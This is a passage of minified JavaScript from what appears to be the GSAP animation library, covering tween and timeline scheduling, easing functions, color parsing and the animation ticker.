  Al = function (e) {
    return Pe(e) || Je(e);
  },
  zg =
    ("function" == typeof ArrayBuffer && ArrayBuffer.isView) || function () {},
  mt = Array.isArray,
  hf = /(?:-?\.?\d|\.)+/gi,
  jg = /[-+=.]*\d+[.e\-+]*\d*[e\-+]*\d*/g,
  fo = /[-+=.]*\d+[.e-]*\d*[a-z%]*/g,
  tc = /[-+=.]*\d+\.?\d*(?:e-|e\+)?\d*/gi,
  Ig = /[+-]=-?[.\d]+/,
  Ag = /[^,'"\[\]\s]+/gi,
  Gy = /^[+\-=e\s\d]*\d+[.\d]*([a-z]*|%)\s*$/i,
  ln = {},
  Wu = {},
  Ug = function (e) {
    return (Wu = ji(e, ln)) && $t;
  },
  $d = function (e, n) {
    return console.warn(
      "Invalid property",
      e,
      "set to",
      n,
      "Missing plugin? gsap.registerPlugin()"
    );
  },
  Yu = function (e, n) {
    return !n && console.warn(e);
  },
  Bg = function (e, n) {
    return (e && (ln[e] = n) && Wu && (Wu[e] = n)) || ln;
  },
  ol = function () {
    return 0;
  },
  Ky = { suppressEvents: !0, isStart: !0, kill: !1 },
  au = { suppressEvents: !0, kill: !1 },
  qy = { suppressEvents: !0 },
  Wd = {},
  Gr = [],
  gf = {},
  Zt = {},
  nc = {},
  Eh = 30,
  cu = [],
  Yd = "",
  Xd = function (e) {
    var r,
      i,
      n = e[0];
    if ((tr(n) || Pe(n) || (e = [e]), !(r = (n._gsap || {}).harness))) {
      for (i = cu.length; i-- && !cu[i].targetTest(n); );
      r = cu[i];
    }
    for (i = e.length; i--; )
      (e[i] && (e[i]._gsap || (e[i]._gsap = new f1(e[i], r)))) ||
        e.splice(i, 1);
    return e;
  },
  Ci = function (e) {
    return e._gsap || Xd(yn(e))[0]._gsap;
  },
  Hg = function (e, n, r) {
    return (r = e[n]) && Pe(r)
      ? e[n]()
      : (Vd(r) && e.getAttribute && e.getAttribute(n)) || r;
  },
  Vt = function (e, n) {
    return (e = e.split(",")).forEach(n) || e;
  },
  De = function (e) {
    return Math.round(1e5 * e) / 1e5 || 0;
  },
  rt = function (e) {
    return Math.round(1e7 * e) / 1e7 || 0;
  },
  So = function (e, n) {
    var r = n.charAt(0),
      i = parseFloat(n.substr(2));
    return (
      (e = parseFloat(e)),
      "+" === r ? e + i : "-" === r ? e - i : "*" === r ? e * i : e / i
    );
  },
  Zy = function (e, n) {
    for (var r = n.length, i = 0; e.indexOf(n[i]) < 0 && ++i < r; );
    return i < r;
  },
  Xu = function () {
    var r,
      i,
      e = Gr.length,
      n = Gr.slice(0);
    for (gf = {}, Gr.length = 0, r = 0; r < e; r++)
      (i = n[r]) && i._lazy && (i.render(i._lazy[0], i._lazy[1], !0)._lazy = 0);
  },
  bg = function (e, n, r, i) {
    Gr.length && !ht && Xu(),
      e.render(n, r, i || (ht && n < 0 && (e._initted || e._startAt))),
      Gr.length && !ht && Xu();
  },
  $g = function (e) {
    var n = parseFloat(e);
    return (n || 0 === n) && (e + "").match(Ag).length < 2
      ? n
      : Je(e)
      ? e.trim()
      : e;
  },
  Wg = function (e) {
    return e;
  },
  Tn = function (e, n) {
    for (var r in n) r in e || (e[r] = n[r]);
    return e;
  },
  Jy = function (e) {
    return function (n, r) {
      for (var i in r)
        i in n || ("duration" === i && e) || "ease" === i || (n[i] = r[i]);
    };
  },
  ji = function (e, n) {
    for (var r in n) e[r] = n[r];
    return e;
  },
  Ph = function t(e, n) {
    for (var r in n)
      "__proto__" !== r &&
        "constructor" !== r &&
        "prototype" !== r &&
        (e[r] = tr(n[r]) ? t(e[r] || (e[r] = {}), n[r]) : n[r]);
    return e;
  },
  Qu = function (e, n) {
    var i,
      r = {};
    for (i in e) i in n || (r[i] = e[i]);
    return r;
  },
  Os = function (e) {
    var n = e.parent || we,
      r = e.keyframes ? Jy(mt(e.keyframes)) : Tn;
    if (Bt(e.inherit))
      for (; n; ) r(e, n.vars.defaults), (n = n.parent || n._dp);
    return e;
  },
  ex = function (e, n) {
    for (var r = e.length, i = r === n.length; i && r-- && e[r] === n[r]; );
    return r < 0;
  },
  Yg = function (e, n, r, i, o) {
    void 0 === r && (r = "_first"), void 0 === i && (i = "_last");
    var l,
      s = e[i];
    if (o) for (l = n[o]; s && s[o] > l; ) s = s._prev;
    return (
      s ? ((n._next = s._next), (s._next = n)) : ((n._next = e[r]), (e[r] = n)),
      n._next ? (n._next._prev = n) : (e[i] = n),
      (n._prev = s),
      (n.parent = n._dp = e),
      n
    );
  },
  wa = function (e, n, r, i) {
    void 0 === r && (r = "_first"), void 0 === i && (i = "_last");
    var o = n._prev,
      s = n._next;
    o ? (o._next = s) : e[r] === n && (e[r] = s),
      s ? (s._prev = o) : e[i] === n && (e[i] = o),
      (n._next = n._prev = n.parent = null);
  },
  ei = function (e, n) {
    e.parent && (!n || e.parent.autoRemoveChildren) && e.parent.remove(e),
      (e._act = 0);
  },
  Ti = function (e, n) {
    if (e && (!n || n._end > e._dur || n._start < 0))
      for (var r = e; r; ) (r._dirty = 1), (r = r.parent);
    return e;
  },
  tx = function (e) {
    for (var n = e.parent; n && n.parent; )
      (n._dirty = 1), n.totalDuration(), (n = n.parent);
    return e;
  },
  _f = function (e, n, r, i) {
    return (
      e._startAt &&
      (ht
        ? e._startAt.revert(au)
        : (e.vars.immediateRender && !e.vars.autoRevert) ||
          e._startAt.render(n, !0, i))
    );
  },
  nx = function t(e) {
    return !e || (e._ts && t(e.parent));
  },
  Nh = function (e) {
    return e._repeat ? jo(e._tTime, (e = e.duration() + e._rDelay)) * e : 0;
  },
  jo = function (e, n) {
    var r = Math.floor((e /= n));
    return e && r === e ? r - 1 : r;
  },
  Gu = function (e, n) {
    return (
      (e - n._start) * n._ts +
      (n._ts >= 0 ? 0 : n._dirty ? n.totalDuration() : n._tDur)
    );
  },
  Sa = function (e) {
    return (e._end = rt(
      e._start + (e._tDur / Math.abs(e._ts || e._rts || fe) || 0)
    ));
  },
  ka = function (e, n) {
    var r = e._dp;
    return (
      r &&
        r.smoothChildTiming &&
        e._ts &&
        ((e._start = rt(
          r._time -
            (e._ts > 0
              ? n / e._ts
              : ((e._dirty ? e.totalDuration() : e._tDur) - n) / -e._ts)
        )),
        Sa(e),
        r._dirty || Ti(r, e)),
      e
    );
  },
  Xg = function (e, n) {
    var r;
    if (
      ((n._time || (n._initted && !n._dur)) &&
        ((r = Gu(e.rawTime(), n)),
        (!n._dur || yl(0, n.totalDuration(), r) - n._tTime > fe) &&
          n.render(r, !0)),
      Ti(e, n)._dp && e._initted && e._time >= e._dur && e._ts)
    ) {
      if (e._dur < e.duration())
        for (r = e; r._dp; )
          r.rawTime() >= 0 && r.totalTime(r._tTime), (r = r._dp);
      e._zTime = -fe;
    }
  },
  Gn = function (e, n, r, i) {
    return (
      n.parent && ei(n),
      (n._start = rt(
        (xr(r) ? r : r || e !== we ? dn(e, r, n) : e._time) + n._delay
      )),
      (n._end = rt(
        n._start + (n.totalDuration() / Math.abs(n.timeScale()) || 0)
      )),
      Yg(e, n, "_first", "_last", e._sort ? "_start" : 0),
      vf(n) || (e._recent = n),
      i || Xg(e, n),
      e._ts < 0 && ka(e, e._tTime),
      e
    );
  },
  Qg = function (e, n) {
    return (
      (ln.ScrollTrigger || $d("scrollTrigger", n)) &&
      ln.ScrollTrigger.create(n, e)
    );
  },
  Gg = function (e, n, r, i, o) {
    return (
      Gd(e, n, o),
      e._initted
        ? !r &&
          e._pt &&
          !ht &&
          ((e._dur && !1 !== e.vars.lazy) || (!e._dur && e.vars.lazy)) &&
          Vg !== en.frame
          ? (Gr.push(e), (e._lazy = [o, i]), 1)
          : void 0
        : 1
    );
  },
  rx = function t(e) {
    var n = e.parent;
    return n && n._ts && n._initted && !n._lock && (n.rawTime() < 0 || t(n));
  },
  vf = function (e) {
    var n = e.data;
    return "isFromStart" === n || "isStart" === n;
  },
  ix = function (e, n, r, i) {
    var a,
      c,
      p,
      o = e.ratio,
      s =
        n < 0 ||
        (!n &&
          ((!e._start && rx(e) && (e._initted || !vf(e))) ||
            ((e._ts < 0 || e._dp._ts < 0) && !vf(e))))
          ? 0
          : 1,
      l = e._rDelay,
      u = 0;
    if (
      (l &&
        e._repeat &&
        ((u = yl(0, e._tDur, n)),
        (c = jo(u, l)),
        e._yoyo && 1 & c && (s = 1 - s),
        c !== jo(e._tTime, l) &&
          ((o = 1 - s), e.vars.repeatRefresh && e._initted && e.invalidate())),
      s !== o || ht || i || e._zTime === fe || (!n && e._zTime))
    ) {
      if (!e._initted && Gg(e, n, i, r, u)) return;
      for (
        p = e._zTime,
          e._zTime = n || (r ? fe : 0),
          r || (r = n && !p),
          e.ratio = s,
          e._from && (s = 1 - s),
          e._time = 0,
          e._tTime = u,
          a = e._pt;
        a;

      )
        a.r(s, a.d), (a = a._next);
      n < 0 && _f(e, n, r, !0),
        e._onUpdate && !r && xn(e, "onUpdate"),
        u && e._repeat && !r && e.parent && xn(e, "onRepeat"),
        (n >= e._tDur || n < 0) &&
          e.ratio === s &&
          (s && ei(e, 1),
          !r &&
            !ht &&
            (xn(e, s ? "onComplete" : "onReverseComplete", !0),
            e._prom && e._prom()));
    } else e._zTime || (e._zTime = n);
  },
  ox = function (e, n, r) {
    var i;
    if (r > n)
      for (i = e._first; i && i._start <= r; ) {
        if ("isPause" === i.data && i._start > n) return i;
        i = i._next;
      }
    else
      for (i = e._last; i && i._start >= r; ) {
        if ("isPause" === i.data && i._start < n) return i;
        i = i._prev;
      }
  },
  Io = function (e, n, r, i) {
    var o = e._repeat,
      s = rt(n) || 0,
      l = e._tTime / e._tDur;
    return (
      l && !i && (e._time *= s / e._dur),
      (e._dur = s),
      (e._tDur = o ? (o < 0 ? 1e10 : rt(s * (o + 1) + e._rDelay * o)) : s),
      l > 0 && !i && ka(e, (e._tTime = e._tDur * l)),
      e.parent && Sa(e),
      r || Ti(e.parent, e),
      e
    );
  },
  Mh = function (e) {
    return e instanceof jt ? Ti(e) : Io(e, e._dur);
  },
  sx = { _start: 0, endTime: ol, totalDuration: ol },
  dn = function t(e, n, r) {
    var l,
      u,
      a,
      i = e.labels,
      o = e._recent || sx,
      s = e.duration() >= vn ? o.endTime(!1) : e._dur;
    return Je(n) && (isNaN(n) || n in i)
      ? ((u = n.charAt(0)),
        (a = "%" === n.substr(-1)),
        (l = n.indexOf("=")),
        "<" === u || ">" === u
          ? (l >= 0 && (n = n.replace(/=/, "")),
            ("<" === u ? o._start : o.endTime(o._repeat >= 0)) +
              (parseFloat(n.substr(1)) || 0) *
                (a ? (l < 0 ? o : r).totalDuration() / 100 : 1))
          : l < 0
          ? (n in i || (i[n] = s), i[n])
          : ((u = parseFloat(n.charAt(l - 1) + n.substr(l + 1))),
            a && r && (u = (u / 100) * (mt(r) ? r[0] : r).totalDuration()),
            l > 1 ? t(e, n.substr(0, l - 1), r) + u : s + u))
      : null == n
      ? s
      : +n;
  },
  Rs = function (e, n, r) {
    var l,
      u,
      i = xr(n[1]),
      o = (i ? 2 : 1) + (e < 2 ? 0 : 1),
      s = n[o];
    if ((i && (s.duration = n[1]), (s.parent = r), e)) {
      for (l = s, u = r; u && !("immediateRender" in l); )
        (l = u.vars.defaults || {}), (u = Bt(u.vars.inherit) && u.parent);
      (s.immediateRender = Bt(l.immediateRender)),
        e < 2 ? (s.runBackwards = 1) : (s.startAt = n[o - 1]);
    }
    return new Ve(n[0], s, n[o + 1]);
  },
  si = function (e, n) {
    return e || 0 === e ? n(e) : n;
  },
  yl = function (e, n, r) {
    return r < e ? e : r > n ? n : r;
  },
  pt = function (e, n) {
    return Je(e) && (n = Gy.exec(e)) ? n[1] : "";
  },
  lx = function (e, n, r) {
    return si(r, function (i) {
      return yl(e, n, i);
    });
  },
  yf = [].slice,
  Kg = function (e, n) {
    return (
      e &&
      tr(e) &&
      "length" in e &&
      ((!n && !e.length) || (e.length - 1 in e && tr(e[0]))) &&
      !e.nodeType &&
      e !== pn
    );
  },
  ux = function (e, n, r) {
    return (
      void 0 === r && (r = []),
      e.forEach(function (i) {
        var o;
        return (Je(i) && !n) || Kg(i, 1)
          ? (o = r).push.apply(o, yn(i))
          : r.push(i);
      }) || r
    );
  },
  yn = function (e, n, r) {
    return Ae && !n && Ae.selector
      ? Ae.selector(e)
      : !Je(e) || r || (!mf && Ao())
      ? mt(e)
        ? ux(e, r)
        : Kg(e)
        ? yf.call(e, 0)
        : e
        ? [e]
        : []
      : yf.call((n || bd).querySelectorAll(e), 0);
  },
  xf = function (e) {
    return (
      (e = yn(e)[0] || Yu("Invalid scope") || {}),
      function (n) {
        var r = e.current || e.nativeElement || e;
        return yn(
          n,
          r.querySelectorAll
            ? r
            : r === e
            ? Yu("Invalid scope") || bd.createElement("div")
            : e
        );
      }
    );
  },
  qg = function (e) {
    return e.sort(function () {
      return 0.5 - Math.random();
    });
  },
  Zg = function (e) {
    if (Pe(e)) return e;
    var n = tr(e) ? e : { each: e },
      r = Ei(n.ease),
      i = n.from || 0,
      o = parseFloat(n.base) || 0,
      s = {},
      l = i > 0 && i < 1,
      u = isNaN(i) || l,
      a = n.axis,
      c = i,
      p = i;
    return (
      Je(i)
        ? (c = p = { center: 0.5, edges: 0.5, end: 1 }[i] || 0)
        : !l && u && ((c = i[0]), (p = i[1])),
      function (f, d, v) {
        var m,
          h,
          _,
          y,
          C,
          k,
          S,
          E,
          P,
          g = (v || n).length,
          T = s[g];
        if (!T) {
          if (!(P = "auto" === n.grid ? 0 : (n.grid || [1, vn])[1])) {
            for (
              S = -vn;
              S < (S = v[P++].getBoundingClientRect().left) && P < g;

            );
            P--;
          }
          for (
            T = s[g] = [],
              m = u ? Math.min(P, g) * c - 0.5 : i % P,
              h = P === vn ? 0 : u ? (g * p) / P - 0.5 : (i / P) | 0,
              S = 0,
              E = vn,
              k = 0;
            k < g;
            k++
          )
            (_ = (k % P) - m),
              (y = h - ((k / P) | 0)),
              (T[k] = C = a ? Math.abs("y" === a ? y : _) : Lg(_ * _ + y * y)),
              C > S && (S = C),
              C < E && (E = C);
          "random" === i && qg(T),
            (T.max = S - E),
            (T.min = E),
            (T.v = g =
              (parseFloat(n.amount) ||
                parseFloat(n.each) *
                  (P > g
                    ? g - 1
                    : a
                    ? "y" === a
                      ? g / P
                      : P
                    : Math.max(P, g / P)) ||
                0) * ("edges" === i ? -1 : 1)),
            (T.b = g < 0 ? o - g : o),
            (T.u = pt(n.amount || n.each) || 0),
            (r = r && g < 0 ? u1(r) : r);
        }
        return (
          (g = (T[f] - T.min) / T.max || 0),
          rt(T.b + (r ? r(g) : g) * T.v) + T.u
        );
      }
    );
  },
  wf = function (e) {
    var n = Math.pow(10, ((e + "").split(".")[1] || "").length);
    return function (r) {
      var i = rt(Math.round(parseFloat(r) / e) * e * n);
      return (i - (i % 1)) / n + (xr(r) ? 0 : pt(r));
    };
  },
  Jg = function (e, n) {
    var i,
      o,
      r = mt(e);
    return (
      !r &&
        tr(e) &&
        ((i = r = e.radius || vn),
        e.values
          ? ((e = yn(e.values)), (o = !xr(e[0])) && (i *= i))
          : (e = wf(e.increment))),
      si(
        n,
        r
          ? Pe(e)
            ? function (s) {
                return (o = e(s)), Math.abs(o - s) <= i ? o : s;
              }
            : function (s) {
                for (
                  var f,
                    d,
                    l = parseFloat(o ? s.x : s),
                    u = parseFloat(o ? s.y : 0),
                    a = vn,
                    c = 0,
                    p = e.length;
                  p--;

                )
                  o
                    ? (f = (f = e[p].x - l) * f + (d = e[p].y - u) * d)
                    : (f = Math.abs(e[p] - l)),
                    f < a && ((a = f), (c = p));
                return (
                  (c = !i || a <= i ? e[c] : s),
                  o || c === s || xr(s) ? c : c + pt(s)
                );
              }
          : wf(e)
      )
    );
  },
  e1 = function (e, n, r, i) {
    return si(mt(e) ? !n : !0 === r ? !!(r = 0) : !i, function () {
      return mt(e)
        ? e[~~(Math.random() * e.length)]
        : (r = r || 1e-5) &&
            (i = r < 1 ? Math.pow(10, (r + "").length - 2) : 1) &&
            Math.floor(
              Math.round((e - r / 2 + Math.random() * (n - e + 0.99 * r)) / r) *
                r *
                i
            ) / i;
    });
  },
  ax = function () {
    for (var e = arguments.length, n = new Array(e), r = 0; r < e; r++)
      n[r] = arguments[r];
    return function (i) {
      return n.reduce(function (o, s) {
        return s(o);
      }, i);
    };
  },
  cx = function (e, n) {
    return function (r) {
      return e(parseFloat(r)) + (n || pt(r));
    };
  },
  fx = function (e, n, r) {
    return n1(e, n, 0, 1, r);
  },
  t1 = function (e, n, r) {
    return si(r, function (i) {
      return e[~~n(i)];
    });
  },
  dx = function t(e, n, r) {
    var i = n - e;
    return mt(e)
      ? t1(e, t(0, e.length), n)
      : si(r, function (o) {
          return ((i + ((o - e) % i)) % i) + e;
        });
  },
  px = function t(e, n, r) {
    var i = n - e,
      o = 2 * i;
    return mt(e)
      ? t1(e, t(0, e.length - 1), n)
      : si(r, function (s) {
          return e + ((s = (o + ((s - e) % o)) % o || 0) > i ? o - s : s);
        });
  },
  sl = function (e) {
    for (var i, o, s, l, n = 0, r = ""; ~(i = e.indexOf("random(", n)); )
      (s = e.indexOf(")", i)),
        (l = "[" === e.charAt(i + 7)),
        (o = e.substr(i + 7, s - i - 7).match(l ? Ag : hf)),
        (r +=
          e.substr(n, i - n) + e1(l ? o : +o[0], l ? 0 : +o[1], +o[2] || 1e-5)),
        (n = s + 1);
    return r + e.substr(n, e.length - n);
  },
  n1 = function (e, n, r, i, o) {
    var s = n - e,
      l = i - r;
    return si(o, function (u) {
      return r + (((u - e) / s) * l || 0);
    });
  },
  hx = function t(e, n, r, i) {
    var o = isNaN(e + n)
      ? 0
      : function (d) {
          return (1 - d) * e + d * n;
        };
    if (!o) {
      var u,
        a,
        c,
        p,
        f,
        s = Je(e),
        l = {};
      if ((!0 === r && (i = 1) && (r = null), s))
        (e = { p: e }), (n = { p: n });
      else if (mt(e) && !mt(n)) {
        for (c = [], p = e.length, f = p - 2, a = 1; a < p; a++)
          c.push(t(e[a - 1], e[a]));
        p--,
          (o = function (v) {
            v *= p;
            var g = Math.min(f, ~~v);
            return c[g](v - g);
          }),
          (r = n);
      } else i || (e = ji(mt(e) ? [] : {}, e));
      if (!c) {
        for (u in n) Qd.call(l, e, u, "get", n[u]);
        o = function (v) {
          return Zd(v, l) || (s ? e.p : e);
        };
      }
    }
    return si(r, o);
  },
  Oh = function (e, n, r) {
    var s,
      l,
      u,
      i = e.labels,
      o = vn;
    for (s in i)
      (l = i[s] - n) < 0 == !!r &&
        l &&
        o > (l = Math.abs(l)) &&
        ((u = s), (o = l));
    return u;
  },
  xn = function (e, n, r) {
    var u,
      a,
      c,
      i = e.vars,
      o = i[n],
      s = Ae,
      l = e._ctx;
    if (o)
      return (
        (u = i[n + "Params"]),
        (a = i.callbackScope || e),
        r && Gr.length && Xu(),
        l && (Ae = l),
        (c = u ? o.apply(a, u) : o.call(a)),
        (Ae = s),
        c
      );
  },
  ms = function (e) {
    return (
      ei(e),
      e.scrollTrigger && e.scrollTrigger.kill(!!ht),
      e.progress() < 1 && xn(e, "onInterrupt"),
      e
    );
  },
  r1 = [],
  i1 = function (e) {
    if (Hd()) {
      var n = (e = (!e.name && e.default) || e).name,
        r = Pe(e),
        i =
          n && !r && e.init
            ? function () {
                this._props = [];
              }
            : e,
        o = {
          init: ol,
          render: Zd,
          add: Qd,
          kill: Ox,
          modifier: Mx,
          rawVars: 0,
        },
        s = { targetTest: 0, get: 0, getSetter: qd, aliases: {}, register: 0 };
      if ((Ao(), e !== i)) {
        if (Zt[n]) return;
        Tn(i, Tn(Qu(e, o), s)),
          ji(i.prototype, ji(o, Qu(e, s))),
          (Zt[(i.prop = n)] = i),
          e.targetTest && (cu.push(i), (Wd[n] = 1)),
          (n =
            ("css" === n ? "CSS" : n.charAt(0).toUpperCase() + n.substr(1)) +
            "Plugin");
      }
      Bg(n, i), e.register && e.register($t, i, Ht);
    } else r1.push(e);
  },
  ce = 255,
  gs = {
    aqua: [0, ce, ce],
    lime: [0, ce, 0],
    silver: [192, 192, 192],
    black: [0, 0, 0],
    maroon: [128, 0, 0],
    teal: [0, 128, 128],
    blue: [0, 0, ce],
    navy: [0, 0, 128],
    white: [ce, ce, ce],
    olive: [128, 128, 0],
    yellow: [ce, ce, 0],
    orange: [ce, 165, 0],
    gray: [128, 128, 128],
    purple: [128, 0, 128],
    green: [0, 128, 0],
    red: [ce, 0, 0],
    pink: [ce, 192, 203],
    cyan: [0, ce, ce],
    transparent: [ce, ce, ce, 0],
  },
  rc = function (e, n, r) {
    return (
      ((6 * (e += e < 0 ? 1 : e > 1 ? -1 : 0) < 1
        ? n + (r - n) * e * 6
        : e < 0.5
        ? r
        : 3 * e < 2
        ? n + (r - n) * (2 / 3 - e) * 6
        : n) *
        ce +
        0.5) |
      0
    );
  },
  o1 = function (e, n, r) {
    var o,
      s,
      l,
      u,
      a,
      c,
      p,
      f,
      d,
      v,
      i = e ? (xr(e) ? [e >> 16, (e >> 8) & ce, e & ce] : 0) : gs.black;
    if (!i) {
      if (("," === e.substr(-1) && (e = e.substr(0, e.length - 1)), gs[e]))
        i = gs[e];
      else if ("#" === e.charAt(0)) {
        if (
          (e.length < 6 &&
            ((o = e.charAt(1)),
            (s = e.charAt(2)),
            (l = e.charAt(3)),
            (e =
              "#" +
              o +
              o +
              s +
              s +
              l +
              l +
              (5 === e.length ? e.charAt(4) + e.charAt(4) : ""))),
          9 === e.length)
        )
          return [
            (i = parseInt(e.substr(1, 6), 16)) >> 16,
            (i >> 8) & ce,
            i & ce,
            parseInt(e.substr(7), 16) / 255,
          ];
        i = [(e = parseInt(e.substr(1), 16)) >> 16, (e >> 8) & ce, e & ce];
      } else if ("hsl" === e.substr(0, 3))
        if (((i = v = e.match(hf)), n)) {
          if (~e.indexOf("="))
            return (i = e.match(jg)), r && i.length < 4 && (i[3] = 1), i;
        } else
          (u = (+i[0] % 360) / 360),
            (a = +i[1] / 100),
            (o =
              2 * (c = +i[2] / 100) -
              (s = c <= 0.5 ? c * (a + 1) : c + a - c * a)),
            i.length > 3 && (i[3] *= 1),
            (i[0] = rc(u + 1 / 3, o, s)),
            (i[1] = rc(u, o, s)),
            (i[2] = rc(u - 1 / 3, o, s));
      else i = e.match(hf) || gs.transparent;
      i = i.map(Number);
    }
    return (
      n &&
        !v &&
        ((o = i[0] / ce),
        (s = i[1] / ce),
        (l = i[2] / ce),
        (c = ((p = Math.max(o, s, l)) + (f = Math.min(o, s, l))) / 2),
        p === f
          ? (u = a = 0)
          : ((d = p - f),
            (a = c > 0.5 ? d / (2 - p - f) : d / (p + f)),
            (u =
              p === o
                ? (s - l) / d + (s < l ? 6 : 0)
                : p === s
                ? (l - o) / d + 2
                : (o - s) / d + 4),
            (u *= 60)),
        (i[0] = ~~(u + 0.5)),
        (i[1] = ~~(100 * a + 0.5)),
        (i[2] = ~~(100 * c + 0.5))),
      r && i.length < 4 && (i[3] = 1),
      i
    );
  },
  s1 = function (e) {
    var n = [],
      r = [],
      i = -1;
    return (
      e.split(Kr).forEach(function (o) {
        var s = o.match(fo) || [];
        n.push.apply(n, s), r.push((i += s.length + 1));
      }),
      (n.c = r),
      n
    );
  },
  Rh = function (e, n, r) {
    var u,
      a,
      c,
      p,
      i = "",
      o = (e + i).match(Kr),
      s = n ? "hsla(" : "rgba(",
      l = 0;
    if (!o) return e;
    if (
      ((o = o.map(function (f) {
        return (
          (f = o1(f, n, 1)) &&
          s +
            (n ? f[0] + "," + f[1] + "%," + f[2] + "%," + f[3] : f.join(",")) +
            ")"
        );
      })),
      r && ((c = s1(e)), (u = r.c).join(i) !== c.c.join(i)))
    )
      for (p = (a = e.replace(Kr, "1").split(fo)).length - 1; l < p; l++)
        i +=
          a[l] +
          (~u.indexOf(l)
            ? o.shift() || s + "0,0,0,0)"
            : (c.length ? c : o.length ? o : r).shift());
    if (!a) for (p = (a = e.split(Kr)).length - 1; l < p; l++) i += a[l] + o[l];
    return i + a[p];
  },
  Kr = (function () {
    var e,
      t =
        "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3,4}){1,2}\\b";
    for (e in gs) t += "|" + e + "\\b";
    return new RegExp(t + ")", "gi");
  })(),
  mx = /hsl[a]?\(/,
  l1 = function (e) {
    var r,
      n = e.join(" ");
    if (((Kr.lastIndex = 0), Kr.test(n)))
      return (
        (r = mx.test(n)),
        (e[1] = Rh(e[1], r)),
        (e[0] = Rh(e[0], r, s1(e[1]))),
        !0
      );
  },
  en = (function () {
    var u,
      a,
      c,
      p,
      f,
      d,
      t = Date.now,
      e = 500,
      n = 33,
      r = t(),
      i = r,
      o = 1e3 / 240,
      s = o,
      l = [],
      v = function g(T) {
        var _,
          y,
          C,
          k,
          m = t() - i,
          h = !0 === T;
        if (
          (m > e && (r += m - n),
          ((_ = (C = (i += m) - r) - s) > 0 || h) &&
            ((k = ++p.frame),
            (f = C - 1e3 * p.time),
            (p.time = C /= 1e3),
            (s += _ + (_ >= o ? 4 : o - _)),
            (y = 1)),
          h || (u = a(g)),
          y)
        )
          for (d = 0; d < l.length; d++) l[d](C, f, k, T);
      };
    return (p = {
      time: 0,
      frame: 0,
      tick: function () {
        v(!0);
      },
      deltaRatio: function (T) {
        return f / (1e3 / (T || 60));
      },
      wake: function () {
        Fg &&
          (!mf &&
            Hd() &&
            ((pn = mf = window),
            (bd = pn.document || {}),
            (ln.gsap = $t),
            (pn.gsapVersions || (pn.gsapVersions = [])).push($t.version),
            Ug(Wu || pn.GreenSockGlobals || (!pn.gsap && pn) || {}),
            (c = pn.requestAnimationFrame),
            r1.forEach(i1)),
          u && p.sleep(),
          (a =
            c ||
            function (T) {
              return setTimeout(T, (s - 1e3 * p.time + 1) | 0);
            }),
          (ll = 1),
          v(2));
      },
      sleep: function () {
        (c ? pn.cancelAnimationFrame : clearTimeout)(u), (ll = 0), (a = ol);
      },
      lagSmoothing: function (T, m) {
        (e = T || 1 / 0), (n = Math.min(m || 33, e));
      },
      fps: function (T) {
        (o = 1e3 / (T || 240)), (s = 1e3 * p.time + o);
      },
      add: function (T, m, h) {
        var _ = m
          ? function (y, C, k, S) {
              T(y, C, k, S), p.remove(_);
            }
          : T;
        return p.remove(T), l[h ? "unshift" : "push"](_), Ao(), _;
      },
      remove: function (T, m) {
        ~(m = l.indexOf(T)) && l.splice(m, 1) && d >= m && d--;
      },
      _listeners: l,
    });
  })(),
  Ao = function () {
    return !ll && en.wake();
  },
  re = {},
  gx = /^[\d.\-M][\d.\-,\s]/,
  _x = /["']/g,
  vx = function (e) {
    for (
      var l,
        u,
        a,
        n = {},
        r = e.substr(1, e.length - 3).split(":"),
        i = r[0],
        o = 1,
        s = r.length;
      o < s;
      o++
    )
      (u = r[o]),
        (l = o !== s - 1 ? u.lastIndexOf(",") : u.length),
        (a = u.substr(0, l)),
        (n[i] = isNaN(a) ? a.replace(_x, "").trim() : +a),
        (i = u.substr(l + 1).trim());
    return n;
  },
  yx = function (e) {
    var n = e.indexOf("(") + 1,
      r = e.indexOf(")"),
      i = e.indexOf("(", n);
    return e.substring(n, ~i && i < r ? e.indexOf(")", r + 1) : r);
  },
  xx = function (e) {
    var n = (e + "").split("("),
      r = re[n[0]];
    return r && n.length > 1 && r.config
      ? r.config.apply(
          null,
          ~e.indexOf("{") ? [vx(n[1])] : yx(e).split(",").map($g)
        )
      : re._CE && gx.test(e)
      ? re._CE("", e)
      : r;
  },
  u1 = function (e) {
    return function (n) {
      return 1 - e(1 - n);
    };
  },
  a1 = function t(e, n) {
    for (var i, r = e._first; r; )
      r instanceof jt
        ? t(r, n)
        : r.vars.yoyoEase &&
          (!r._yoyo || !r._repeat) &&
          r._yoyo !== n &&
          (r.timeline
            ? t(r.timeline, n)
            : ((i = r._ease),
              (r._ease = r._yEase),
              (r._yEase = i),
              (r._yoyo = n))),
        (r = r._next);
  },
  Ei = function (e, n) {
    return (e && (Pe(e) ? e : re[e] || xx(e))) || n;
  },
  Hi = function (e, n, r, i) {
    void 0 === r &&
      (r = function (u) {
        return 1 - n(1 - u);
      }),
      void 0 === i &&
        (i = function (u) {
          return u < 0.5 ? n(2 * u) / 2 : 1 - n(2 * (1 - u)) / 2;
        });
    var s,
      o = { easeIn: n, easeOut: r, easeInOut: i };
    return (
      Vt(e, function (l) {
        for (var u in ((re[l] = ln[l] = o), (re[(s = l.toLowerCase())] = r), o))
          re[
            s + ("easeIn" === u ? ".in" : "easeOut" === u ? ".out" : ".inOut")
          ] = re[l + "." + u] = o[u];
      }),
      o
    );
  },
  c1 = function (e) {
    return function (n) {
      return n < 0.5 ? (1 - e(1 - 2 * n)) / 2 : 0.5 + e(2 * (n - 0.5)) / 2;
    };
  },
  ic = function t(e, n, r) {
    var i = n >= 1 ? n : 1,
      o = (r || (e ? 0.3 : 0.45)) / (n < 1 ? n : 1),
      s = (o / pf) * (Math.asin(1 / i) || 0),
      l = function (c) {
        return 1 === c ? 1 : i * Math.pow(2, -10 * c) * Qy((c - s) * o) + 1;
      },
      u =
        "out" === e
          ? l
          : "in" === e
          ? function (a) {
              return 1 - l(1 - a);
            }
          : c1(l);
    return (
      (o = pf / o),
      (u.config = function (a, c) {
        return t(e, a, c);
      }),
      u
    );
  },
  oc = function t(e, n) {
    void 0 === n && (n = 1.70158);
    var r = function (s) {
        return s ? --s * s * ((n + 1) * s + n) + 1 : 0;
      },
      i =
        "out" === e
          ? r
          : "in" === e
          ? function (o) {
              return 1 - r(1 - o);
            }
          : c1(r);
    return (
      (i.config = function (o) {
        return t(e, o);
      }),
      i
    );
  };
Vt("Linear,Quad,Cubic,Quart,Quint,Strong", function (t, e) {
  var n = e < 5 ? e + 1 : e;
  Hi(
    t + ",Power" + (n - 1),
    e
      ? function (r) {
